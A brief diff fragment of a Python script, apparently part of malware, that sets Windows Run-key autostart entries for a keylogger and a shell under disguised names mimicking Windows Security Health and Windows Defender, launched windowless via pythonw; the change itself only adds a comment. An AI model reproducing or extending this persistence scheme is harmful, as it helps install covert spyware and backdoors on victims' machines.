@@ -8,7 +8,7 @@ REG_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
 REG_NAME_KEYLOGGER  = "WindowsSecurityHealth"
 REG_NAME_SHELL      = "WindowsDefenderService"
 
-
+# helper functions
 def _get_path(script_name: str) -> str:
     """Returns a quoted pythonw + script path for a given script in this directory."""
     python = Path(sys.executable).with_name("pythonw.exe")
